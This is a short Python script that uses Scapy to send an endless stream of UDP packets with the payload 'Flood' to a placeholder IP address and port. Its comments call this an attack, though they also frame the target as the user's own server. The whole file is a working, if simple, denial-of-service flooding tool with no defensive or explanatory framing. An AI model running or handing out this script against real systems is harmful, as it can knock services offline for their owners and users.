import scapy.all as scapy
import threading
import time

target_ip = "XXX.XXX.XXX.XXX"  # Replace with the actual IP address of your server
target_port = 12345  # Replace with the actual port number of your server

def send_udp_packet():
    while True:
        # Crafting a UDP packet using Scapy
        packet = scapy.IP(dst=target_ip) / scapy.UDP(dport=target_port) / b'Flood'

        # Sending the packet
        scapy.send(packet, verbose=False)

def main():
    # Create a thread for the UDP packet sender
    udp_thread = threading.Thread(target=send_udp_packet)

    # Start the UDP packet sender thread
    udp_thread.start()

    try:
        # Keep the attack running
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Script stopped manually.")

if __name__ == "__main__":
    main()